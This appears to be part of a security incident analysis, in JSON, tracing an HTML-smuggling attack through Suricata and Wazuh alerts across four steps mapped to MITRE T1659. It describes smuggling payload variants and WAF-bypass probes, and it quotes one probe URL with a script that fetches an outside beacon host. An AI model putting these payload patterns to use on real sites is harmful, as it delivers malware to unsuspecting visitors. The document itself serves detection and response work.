  "attack_progression": [
    {"step": 1, "tactic": "Initial Access — Content Injection", "technique": "T1659", "what_happened": "At 2026-03-04 01:08:14 CET, Suricata logged repeated HTTP POST requests from data.srcip=45.83.12.7 to data.dstip=10.108.57.184 against writable content endpoints (/api/comments, /api/feedback). The POST bodies carried HTML-smuggling payload variants: an <a href='data:application/octet-stream;base64,...' download='update.exe'> auto-click anchor, a Blob-constructor variant building the file client-side via URL.createObjectURL, an iframe srcdoc variant, and a meta-refresh data: URI redirect. The attacker rotated four browser User-Agents across the requests. Suricata fired 'ET POLICY HTML Smuggling Attempt' (signature_id 2035775) on the data: URI + Blob patterns in the request bodies. The intent is to STORE the smuggling page in a trusted endpoint so it is later served back to victim browsers.", "chain_reason": "Suricata signature 'ET POLICY HTML Smuggling Attempt' (sig_id 2035775) triggered with data.srcip=45.83.12.7 → data.dstip=10.108.57.184 on data.dstport=80, request bodies containing 'data:application/octet-stream;base64' and 'createObjectURL'. Wazuh web-attack rule 31103 (content injection) attached. MITRE T1659 (Content Injection) mapped by the rule.", "first_seen": "2026-03-04T01:08:14+0100"},
    {"step": 2, "tactic": "Initial Access — Stored Payload Verification", "technique": "T1659", "what_happened": "At 01:13:40 CET the same data.srcip=45.83.12.7 issued HTTP GET requests to /api/comments, /api/feedback, /forum, /comments and / on 10.108.57.184. Suricata flagged the GET responses because the rendered response bodies echoed back the stored smuggling markup — data: URIs, 'new Blob' and 'download=' attributes appeared in the HTTP response payload. This confirms the Phase-1 injection was PERSISTENT: the malicious HTML is now stored and served to any browser that loads those pages. ET POLICY HTML Smuggling signature 2035775 fired again, this time on response-body content.", "chain_reason": "Suricata signature 2035775 'ET POLICY HTML Smuggling Attempt' fired on data.dstip=45.83.12.7 (response direction) with data.http.url in {/api/comments, /api/feedback, /forum, /}; response bodies contained 'data:application/octet-stream' and 'download='. Same data.srcip as Step 1 confirms the actor verifying their own stored payload.", "first_seen": "2026-03-04T01:13:40+0100"},
    {"step": 3, "tactic": "Initial Access — WAF Bypass Probing", "technique": "T1659", "what_happened": "At 01:18:55 CET data.srcip=45.83.12.7 sent a burst of GET requests carrying data: URIs directly in query-string parameters (/redirect?url=data:text/html..., /share?link=data:application/octet-stream..., /preview?src=data:image/svg+xml..., /open?href=data:text/html,<script>fetch('http://198.18.0.71/beacon')</script>) plus a multipart/form-data POST with Content-Disposition filename='invoice.exe' and Content-Type application/octet-stream. These exercise content-type-confusion and data: URI WAF-bypass patterns. Suricata fired HTML-smuggling and content-injection signatures across the window.", "chain_reason": "Suricata signature 2035775 plus generic data:-URI inspection signatures with data.srcip=45.83.12.7, data.http.url containing 'data:text/html' and 'data:application/octet-stream'. One probe URL embeds the literal C2 host http://198.18.0.71/beacon inside a data:text/html script — directly links Phase 3 to the Phase-4 beacon.", "first_seen": "2026-03-04T01:18:55+0100"},
    {"step": 4, "tactic": "Command and Control — Delivery Confirmation Beacon", "technique": "T1659", "what_happened": "At 01:22:09 CET, three outbound HTTP GET requests left toward data.dstip=198.18.0.71 to the path /delivered?run=N&ts=... with Referer header set to http://10.108.57.184/. This is the delivery-confirmation beacon the injected JavaScript would fire after the auto-download triggers in a victim browser — the attacker simulating the callback that confirms the smuggled payload reached an endpoint. Suricata logged the outbound connections to the non-routable lab C2 IP 198.18.0.71.", "chain_reason": "Suricata flow records with data.dstip=198.18.0.71, data.dstport=80, data.http.url='/delivered', Referer header http://10.108.57.184/ tying the beacon back to the injected page. The Referer chains the C2 callback to the compromised content host.", "first_seen": "2026-03-04T01:22:09+0100"}
  ],
